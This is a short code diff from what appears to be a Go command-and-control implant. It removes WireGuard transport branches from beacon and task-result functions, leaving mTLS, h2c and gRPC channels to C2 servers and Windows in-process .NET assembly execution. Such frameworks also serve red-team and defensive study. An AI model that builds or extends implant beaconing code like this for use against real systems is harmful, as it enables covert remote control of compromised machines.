@@ -202,9 +202,6 @@ func init() {
 	// mTLS transport config
 	initMTLS()
 
-	// WireGuard transport config
-	initWG()
-
 	// Initialize CLR (.NET) hosting for in-process assembly execution
 	if runtime.GOOS == "windows" {
 		useCLRHosting = initCLRHosting()
@@ -862,8 +859,6 @@ func doBeacon() {
 		respBody = sendMTLSBeacon(sendBody)
 	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
 		respBody = sendH2CBeacon(sendBody)
-	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
-		respBody = sendWGBeacon(sendBody)
 	} else {
 		respBody = sendWithMode(sendBody)
 	}
@@ -1302,8 +1297,6 @@ func sendTaskResult(res TaskResult) {
 		sendMTLSBeacon(sendBody)
 	} else if BeaconTransport == "h2c" || strings.HasPrefix(C2URLs[currentC2Idx], "h2c://") {
 		sendH2CBeacon(sendBody)
-	} else if BeaconTransport == "wg" || strings.HasPrefix(C2URLs[currentC2Idx], "wg://") {
-		sendWGBeacon(sendBody)
 	} else if BeaconTransport == "grpc" || strings.HasPrefix(C2URLs[currentC2Idx], "grpc://") || strings.HasPrefix(C2URLs[currentC2Idx], "grpcs://") {
 		sendGRPCBeacon(sendBody)
 	} else {
